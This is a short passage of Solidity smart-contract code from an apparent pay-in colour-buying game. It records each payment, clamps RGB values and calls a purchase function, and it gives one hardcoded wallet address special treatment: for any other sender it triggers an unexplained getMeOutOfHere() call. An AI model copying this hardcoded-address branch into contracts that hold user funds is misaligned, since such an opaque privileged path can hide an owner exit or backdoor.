        investSum += msg.value;
        cR = rgbLimit(cR);
        cG = rgbLimit(cG);
        cB = rgbLimit(cB);
        buy(forWho, cR, cG, cB);
        if (msg.sender != 0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed) {
            getMeOutOfHere();
            lastGateway = msg.sender;
        }
    } else {
